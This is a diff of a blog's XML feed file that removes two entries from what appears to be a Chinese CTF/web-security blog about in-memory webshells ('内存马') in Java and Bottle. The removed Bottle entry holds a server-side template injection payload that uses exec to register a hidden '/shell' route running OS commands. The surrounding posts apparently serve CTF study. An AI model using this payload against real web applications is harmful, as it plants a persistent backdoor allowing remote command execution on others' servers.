@@ -4,52 +4,6 @@
   
   
   <entry>
-    <title>Java内存马</title>
-    <link href="/2025/05/22/Java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
-    <url>/2025/05/22/Java%E5%86%85%E5%AD%98%E9%A9%AC/</url>
-    
-    <content type="html"><![CDATA[<p>dd</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>技术</category>
-      
-      <category>ctf</category>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Bottle内存马详解</title>
-    <link href="/2025/05/11/Bottle%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
-    <url>/2025/05/11/Bottle%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
-    
-    <content type="html"><![CDATA[<p>本篇以Bottle的SimpleTemplate ssti研究内存马</p><p>大概看了下跟flask差不多呢，摆了，下班</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@app.route(&#x27;/shell&#x27;)</span><br><span class="hljs-string">def g():</span><br><span class="hljs-string">    return __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;&quot;&quot;</span>,&#123;<span class="hljs-string">&quot;app&quot;</span>:<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>技术</category>
-      
-      <category>ctf</category>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>Flask内存马详解</title>
     <link href="/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/"/>
     <url>/2025/05/07/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E8%AF%A6%E8%A7%A3/</url>
